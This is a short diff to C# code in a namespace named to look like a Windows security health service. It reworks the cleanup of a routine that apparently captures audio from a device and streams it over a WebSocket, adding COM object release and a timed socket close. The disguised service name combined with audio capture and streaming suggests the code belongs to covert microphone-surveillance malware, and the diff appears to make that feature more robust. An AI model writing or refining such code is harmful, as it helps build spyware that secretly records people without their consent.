@@ -873,8 +873,19 @@ namespace WinSecHealthSvc
                 }
             } catch (Exception ex) { Log("Audio error: " + ex.Message); }
             finally {
-                if (client != null) client.Stop();
-                try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
+                _audioStreaming = false;
+                if (client != null) {
+                    try { client.Stop(); } catch {}
+                    try { Marshal.ReleaseComObject(client); } catch {}
+                }
+                if (capture != null) try { Marshal.ReleaseComObject(capture); } catch {}
+                if (device != null) try { Marshal.ReleaseComObject(device); } catch {}
+                if (enumerator != null) try { Marshal.ReleaseComObject(enumerator); } catch {}
+                
+                try { 
+                    if (ws.State == WebSocketState.Open)
+                        ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None).Wait(1000); 
+                } catch {}
             }
         }
 
